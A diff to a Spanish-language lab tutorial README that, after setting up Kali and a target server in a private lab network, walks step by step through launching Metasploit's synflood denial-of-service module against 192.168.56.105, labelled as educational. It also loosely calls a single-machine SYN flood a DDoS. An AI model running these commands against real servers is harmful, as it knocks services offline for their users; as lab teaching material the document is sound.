@@ -92,8 +92,60 @@ Una vez estamos dentro de las dos maquinas, desde la de Kali vamos a realizar un
 
 Si resuelve igual que en la imagen anterior, significa que todo está instalado correctamente. 
 
+Podemos ingresar a la pagina del servidor si desde nuestro Kali Linux introducimos la IP del mismo:
 
-           
+![imagen](https://user-images.githubusercontent.com/80277545/146824329-c54b8f79-1911-4c92-9383-7ea58c62a5ee.png)
+
+# PRACTICA: Realizando un ataque DDoS 
+
+( El fin de esta practica es educativo )
+
+Desde nuestro Kali, vamos a usar un exploit de Metasploit (recordemos que Metasploit simplemente es como una libreria de exploits, una libreria de herramientas). 
+
+Abriremos una terminal y ejecutaremos:
+
+        sudo -i 
+        
+
+Iniciaremos Metasploit en modo superusuario: 
+
+        sudo msfdb init && msfconsole
+        
+![imagen](https://user-images.githubusercontent.com/80277545/146827302-48d76b0a-6696-4606-b135-684022cd46e2.png)
+
+
+Una vez dentro de Metasploit buscaremos la herramienta/exploit synflood , esto lo haremos con el parametro "search"
+
+        search dos synflood
+        
+![imagen](https://user-images.githubusercontent.com/80277545/146827368-3bce3c42-0b3b-46d1-893d-85a5c8f08aaf.png)
+
+
+Seleccionaremos la opción "/auxiliary/dos/tcp/synflood" , esto lo haremos con: 
+
+         use 0 
+
+Una vez seleccionado, miraremos los paramtros de la herramienta con "info":
+
+        info
+        
+![imagen](https://user-images.githubusercontent.com/80277545/146827466-4088f6be-5251-4c56-9531-42ceb6b87c1c.png)
+
+A continuación pondremos la IP de la maquina a atacar, en este caso será la 192.168.56.105 y ejecutaremos un run:
+
+        set rhosts 192.168.56.105
+        run
+
+Al instante se inciará el ataque DDoS:
+
+        ![imagen](https://user-images.githubusercontent.com/80277545/146827705-d3f29f69-e187-49bb-b7ad-99b459d4e98d.png)
+
+
+Cuando se esté realizando el ataque, al recargar la pagina en el navegador, no nos resolverá la petición y se quedará cargando. Esto significará que el servidor está siendo atacado y no puede responder las solicitudes. 
+
+
+
+
 
 
 
